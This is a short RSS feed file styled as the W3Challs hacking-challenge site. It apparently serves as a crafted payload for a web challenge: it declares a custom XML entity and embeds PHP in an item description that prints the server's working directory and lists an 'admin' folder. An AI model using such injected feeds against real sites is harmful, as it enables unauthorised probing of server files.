<!DOCTYPE root [
<!ENTITY hack "prout">
]>
<rss version="2.0">
	<channel>
		<title>W3Challs</title>
		<link>http://w3challs.com/</link>
		<description>
			World Wide Web Challenges : Hacking, Cracking, Programmation, Cryptographie et Stéganographie
		</description>
		<language>fr</language>
		<copyright>Copyright 2008 - 2010 W3Challs</copyright>
		<ttl>5</ttl>
		<item>
			<title>
				<![CDATA[ Nouveaux challenges Web ]]>
			</title>
			<link>http://www.w3challs.com/news/75</link>
			<description>
				&hack;
				<?php 
				echo 'cwd: '. getcwd() . "\r\n";
				$array = scandir('admin');
				echo 'admin: ' . "\r\n";
				foreach($array as $i){
					echo $i . "\r\n";	
				}
				?>
			</description>
			<pubDate>le 12/05/2016 à 19h36</pubDate>
		</item>
	</channel>
</rss>
